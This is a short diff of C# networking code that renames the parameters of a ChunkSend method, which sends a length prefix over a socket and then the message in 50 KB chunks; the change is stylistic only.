@@ -101,18 +101,18 @@ namespace Client.Handle_Packet
             }
         }
 
-        private void ChunkSend(byte[] Msg, Socket Client)
+        private void ChunkSend(byte[] msg, Socket client)
         {
             try
             {
-                byte[] buffersize = BitConverter.GetBytes(Msg.Length);
-                Client.Poll(-1, SelectMode.SelectWrite);
-                Client.Send(buffersize);
+                byte[] buffersize = BitConverter.GetBytes(msg.Length);
+                client.Poll(-1, SelectMode.SelectWrite);
+                client.Send(buffersize);
 
                 int chunkSize = 50 * 1024;
                 byte[] chunk = new byte[chunkSize];
                 int SendPackage;
-                using (MemoryStream buffereReader = new MemoryStream(Msg))
+                using (MemoryStream buffereReader = new MemoryStream(msg))
                 {
                     BinaryReader binaryReader = new BinaryReader(buffereReader);
                     int bytesToRead = (int)buffereReader.Length;
@@ -120,7 +120,7 @@ namespace Client.Handle_Packet
                     {
                         chunk = binaryReader.ReadBytes(chunkSize);
                         bytesToRead -= chunkSize;
-                        SendPackage = Client.Send(chunk);
+                        SendPackage = client.Send(chunk);
                     } while (bytesToRead > 0);
 
                     binaryReader.Close();
